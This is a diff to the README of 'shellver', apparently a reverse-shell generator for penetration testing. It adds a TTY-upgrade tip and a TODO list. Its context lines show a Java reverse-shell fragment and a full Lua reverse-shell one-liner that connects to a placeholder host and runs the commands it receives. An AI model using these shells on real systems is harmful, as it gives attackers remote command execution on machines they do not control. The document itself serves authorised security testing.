@@ -42,6 +42,8 @@ Needs [msfpc](https://github.com/g0tmi1k/msfpc) for msfvenom payloads.
 
 <img src="https://github.com/jonasw234/shellver/blob/master/ss/py2.png" >
 
+(like it says you should use my [upgrade-tty](https://github.com/jonasw234/upgrade-tty) to upgrade your TTY!) 
+
 `shellver msf`
 
 <img src="https://github.com/jonasw234/shellver/blob/master/ss/all.png" >
@@ -147,6 +149,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ║ Windows and Linux ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ╚═══════════════════╩═══════════════════════════════
 ```
+
+# TODO
+⬚ `msfvenom` payloads where no compatible `msfpc` payload exists (e.g. shellcode) don’t automatically spawn a shell yet
+⬚ Sanity check for user inputs and ask for corrections
+⬚ Make it possible to use non-default network interfaces when you have more than one
 
 # Thanks to
 * [The original shellver](https://github.com/0xR0/shellver)
